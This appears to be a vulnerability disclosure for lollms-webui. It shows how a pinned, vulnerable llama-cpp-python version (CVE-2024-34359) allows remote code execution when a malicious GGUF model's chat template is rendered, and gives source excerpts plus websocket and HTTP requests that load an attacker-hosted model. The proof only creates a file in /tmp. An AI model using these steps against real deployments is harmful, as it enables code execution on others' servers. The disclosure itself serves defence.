# Vulnerable `llama-cpp-python` dependency in `lollms-webui` allow arbitrary code execution when loading a external `gguf` format model file.



## Description

`lollms-webui` allow users to use built-in native `bindings` to load and host user's very own LLM; `python_llama_cpp` is an pre-installed built-in native `bindings` that allows user to host their `llama.cpp` complied `gguf` model files in `lollms-webui` to interact and chat with it. Nevertheless, the pre-defined version of `llama-cpp-python` (*`llama_cpp_python-0.2.61+cpuavx2-cp311-cp311-manylinux_2_31_x86_64`*) is vulnerable to to an recently `found & patch` 1day `RCE` -> `CVE-2024-34359` (Currently processing in `github-adversary` but yet patch in `b454f40a`). Within this 1day vulnerability combined with `lollms-webui`'s `binding_zoo` feature; attackers can upload hugging-face hosted malicious model file & interact thereby resulting `Remote-Code Execution`

## Source-to-Sink

#### `lollm-webui/zoos/bindings_zoo/python_llama_cpp/requirements.txt`

here specified the `llama-cpp-python` dependency for installation process:

```python
# llama-cpp-python (CPU only, AVX2)
https://github.com/oobabooga/llama-cpp-python-cuBLAS-wheels/releases/download/cpu/llama_cpp_python-0.2.61+cpuavx2-cp311-cp311-manylinux_2_31_x86_64.whl; platform_system == "Linux" and platform_machine == "x86_64" and python_version == "3.11"
https://github.com/oobabooga/llama-cpp-python-cuBLAS-wheels/releases/download/cpu/llama_cpp_python-0.2.61+cpuavx2-cp311-cp311-win_amd64.whl; platform_system == "Windows" and python_version == "3.11"

# llama-cpp-python (CUDA, no tensor cores)
https://github.com/oobabooga/llama-cpp-python-cuBLAS-wheels/releases/download/textgen-webui/llama_cpp_python_cuda-0.2.61+cu121-cp311-cp311-win_amd64.whl; platform_system == "Windows" and python_version == "3.11"
https://github.com/oobabooga/llama-cpp-python-cuBLAS-wheels/releases/download/textgen-webui/llama_cpp_python_cuda-0.2.61+cu121-cp311-cp311-manylinux_2_31_x86_64.whl; platform_system == "Linux" and platform_machine == "x86_64" and python_version == "3.11"

# llama-cpp-python (CUDA, tensor cores)
https://github.com/oobabooga/llama-cpp-python-cuBLAS-wheels/releases/download/textgen-webui/llama_cpp_python_cuda_tensorcores-0.2.61+cu121-cp311-cp311-win_amd64.whl; platform_system == "Windows" and python_version == "3.11"
https://github.com/oobabooga/llama-cpp-python-cuBLAS-wheels/releases/download/textgen-webui/llama_cpp_python_cuda_tensorcores-0.2.61+cu121-cp311-cp311-manylinux_2_31_x86_64.whl; platform_system == "Linux" and platform_machine == "x86_64" and python_version == "3.11"

# CUDA wheels
https://github.com/jllllll/AutoGPTQ/releases/download/v0.6.0/auto_gptq-0.6.0+cu121-cp311-cp311-win_amd64.whl; platform_system == "Windows" and python_version == "3.11"
https://github.com/jllllll/AutoGPTQ/releases/download/v0.6.0/auto_gptq-0.6.0+cu121-cp311-cp311-linux_x86_64.whl; platform_system == "Linux" and platform_machine == "x86_64" and python_version == "3.11"
https://github.com/oobabooga/exllamav2/releases/download/v0.0.15/exllamav2-0.0.15+cu121-cp311-cp311-win_amd64.whl; platform_system == "Windows" and python_version == "3.11"
https://github.com/oobabooga/exllamav2/releases/download/v0.0.15/exllamav2-0.0.15+cu121-cp311-cp311-linux_x86_64.whl; platform_system == "Linux" and platform_machine == "x86_64" and python_version == "3.11"
https://github.com/oobabooga/exllamav2/releases/download/v0.0.15/exllamav2-0.0.15-py3-none-any.whl; platform_system == "Linux" and platform_machine != "x86_64"
https://github.com/oobabooga/flash-attention/releases/download/v2.5.6/flash_attn-2.5.6+cu122torch2.2.0cxx11abiFALSE-cp311-cp311-win_amd64.whl; platform_system == "Windows" and python_version == "3.11"
https://github.com/Dao-AILab/flash-attention/releases/download/v2.5.6/flash_attn-2.5.6+cu122torch2.2cxx11abiFALSE-cp311-cp311-linux_x86_64.whl; platform_system == "Linux" and platform_machine == "x86_64" and python_version == "3.11"
https://github.com/jllllll/GPTQ-for-LLaMa-CUDA/releases/download/0.1.1/gptq_for_llama-0.1.1+cu121-cp311-cp311-win_amd64.whl; platform_system == "Windows" and python_version == "3.11"
https://github.com/jllllll/GPTQ-for-LLaMa-CUDA/releases/download/0.1.1/gptq_for_llama-0.1.1+cu121-cp311-cp311-linux_x86_64.whl; platform_system == "Linux" and platform_machine == "x86_64" and python_version == "3.11"
https://github.com/jllllll/ctransformers-cuBLAS-wheels/releases/download/AVX2/ctransformers-0.2.27+cu121-py3-none-any.whl
autoawq==0.2.3; platform_system == "Linux" or platform_system == "Windows"
```

#### `lollm-webui/zoos/bindings_zoo/python_llama_cpp/__init__.py`

After this binding is selected, user can firstly download any specified model that is hosting on huggingface by the native `install_model` `websocket` endpoint, since no malicious payload will be injection in the request; this request will not be intercept by the security sanitizers. After-that, we can chat with the model we selected:

```python
        if "llava" in self.config.model_name.lower() or "vision" in self.config.model_name.lower():
            mmproj_variants = [v for v in model_path.parent.iterdir() if "mmproj" in str(v)]
            if len(mmproj_variants)==0:
                self.InfoMessage("Projector file was not found. Please download it first.\nReverting to text only")

                self.model = Llama(
                                        model_path=str(model_path), 
                                        n_gpu_layers=self.binding_config.n_gpu_layers, 
                                        main_gpu=self.binding_config.main_gpu, 
                                        n_ctx=self.config.ctx_size,
                                        n_threads=self.binding_config.n_threads,
                                        n_batch=self.binding_config.batch_size,
                                        offload_kqv=self.binding_config.offload_kqv,
                                        seed=self.binding_config.seed,
                                        lora_path=self.binding_config.lora_path,
                                        lora_scale=self.binding_config.lora_scale
                                    )

            else:
                proj_file = mmproj_variants[0]
                self.binding_type = BindingType.TEXT_IMAGE
                self.chat_handler = self.llama_cpp.llama_chat_format.Llava15ChatHandler(clip_model_path=str(proj_file))
                self.model = Llama(
                                        model_path=str(model_path), 
                                        n_gpu_layers=self.binding_config.n_gpu_layers, 
                                        main_gpu=self.binding_config.main_gpu, 
                                        n_ctx=self.config.ctx_size,
                                        n_threads=self.binding_config.n_threads,
                                        n_batch=self.binding_config.batch_size,
                                        offload_kqv=self.binding_config.offload_kqv,
                                        seed=self.binding_config.seed,
                                        lora_path=self.binding_config.lora_path,
                                        lora_scale=self.binding_config.lora_scale,

                                        chat_handler=self.chat_handler,
                                        logits_all=True
                                    )
        else:
            self.model = Llama(
                                    model_path=str(model_path), 
                                    n_gpu_layers=self.binding_config.n_gpu_layers, 
                                    main_gpu=self.binding_config.main_gpu, 
                                    n_ctx=self.config.ctx_size,
                                    n_threads=self.binding_config.n_threads,
                                    n_batch=self.binding_config.batch_size,
                                    offload_kqv=self.binding_config.offload_kqv,
                                    seed=self.binding_config.seed,
                                    lora_path=self.binding_config.lora_path,
                                    lora_scale=self.binding_config.lora_scale
                                )
```

Here `lollms-webui` loads the `Llama class` differently depends on whether if `self.config.model_name.lower()` is `llava` and `mmproj_variants = [v for v in model_path.parent.iterdir() if "mmproj" in str(v)]`, in our cases, our model will be custom not `llava` thus will be defined at the first level `else` statement.

Furthermore, `lollm-webui` interact with the model using the generate method:

```python
    def generate(self, 
                 prompt:str,                  
                 n_predict: int = 128,
                 callback: Callable[[str], None] = None,
                 verbose: bool = False,
                 **gpt_params ):
        
        """Generates text out of a prompt

        Args:
            prompt (str): The prompt to use for generation
            n_predict (int, optional): Number of tokens to predict. Defaults to 128.
            callback (Callable[[str], None], optional): A callback function that is called every time a new text element is generated. Defaults to None.
            verbose (bool, optional): If true, the code will spit many information about the generation process. Defaults to False.
            **gpt_params: Additional parameters for GPT generation.
                temperature (float, optional): Controls the randomness of the generated text. Higher values (e.g., 1.0) make the output more random, while lower values (e.g., 0.2) make it more deterministic. Defaults to 0.7 if not provided.
                top_k (int, optional): Controls the diversity of the generated text by limiting the number of possible next tokens to consider. Defaults to 0 (no limit) if not provided.
                top_p (float, optional): Controls the diversity of the generated text by truncating the least likely tokens whose cumulative probability exceeds `top_p`. Defaults to 0.0 (no truncation) if not provided.
                repeat_penalty (float, optional): Adjusts the penalty for repeating tokens in the generated text. Higher values (e.g., 2.0) make the model less likely to repeat tokens. Defaults to 1.0 if not provided.

        Returns:
            str: The generated text based on the prompt
        """
        default_params = {
            'temperature': float(self.config.temperature),
            'top_k': int(self.config.top_k),
            'top_p': float(self.config.top_p),
            'repeat_penalty': float(self.config.repeat_penalty),
            'last_n_tokens' : int(self.config.repeat_last_n),
            "seed":int(self.binding_config.seed),
            "n_threads":self.binding_config.n_threads,
            "batch_size":self.binding_config.batch_size
        }
        gpt_params = {**default_params, **gpt_params}
        if gpt_params['seed']!=-1:
            self.seed = self.binding_config.seed


        if self.binding_config.generation_mode=="chat":

            try:
                output = ""
                # self.model.reset()
                count = 0
                for chunk in self.model.create_chat_completion(
                                    messages = [                             
                                        {
                                            "role": "user",
                                            "content":prompt
                                        }
                                    ],
                                    max_tokens=n_predict,
                                    temperature=float(gpt_params["temperature"]),
                                    stop=["<0x0A>"],
                                    stream=True
                                ):

```

the method used `create_chat_completion`'s `messages` array to create chat completion. This made the exploitation exploitable since the `chat_template` will be rendered.

## Exploitation

Full PoC Video: https://drive.google.com/file/d/1JsD1dlnRYAAgHzxUbS0KFm2ygDNBhr7U/view?usp=sharing

For `llama-cpp-python` to download our huggingface-hosting, we can intercept the original download model request into our url

```yaml
42["install_model",{"path":"https://huggingface.co/bartowski/Code-Llama-3-8B-GGUF/resolve/main/Code-Llama-3-8B-IQ1_M.gguf","name":"Code-Llama-3-8B-GGUF","variant_name":"Code-Llama-3-8B-IQ1_M.gguf","type":"gguf"}]
```

-> 

```yaml
42["install_model",{"path":"https://huggingface.co/Retr0REG/Whats-up-gguf/resolve/main/retr0reg.gguf","name":"retr0reg","variant_name":"retr0reg","type":"gguf"}]
```

This model will create file `/tmp/retr0reg` after generation:

<img src="https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405102229588.png" alt="image-20240510210756233" style="zoom:25%;" />

After that, we can use `/update_setting` to update the model:

```yaml
POST /update_setting HTTP/1.1
Host: localhost:9600
Content-Length: 103
sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
Accept: application/json
Content-Type: application/json
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:9600
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:9600/settings/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: ajs_anonymous_id=51eb7ea5-b31a-4838-8379-0b8286352b8e; session=4db469b6-4260-4aed-b317-5de99d428beb.lWAWJLc56QhdQUUadp2-5no-R8g
Connection: close

{"client_id":"wPYDBdLlccKpDxvfAAAH","setting_name":"retr0reg","setting_value":"retr0reg"}
```

Notice here, `/update_setting` does not require any Server-Side conformation.

After, we can chat with the model in the index page, remember to set `generation mode` to `chat` if you changed it

Now the `/tmp/retr0reg` will be created.



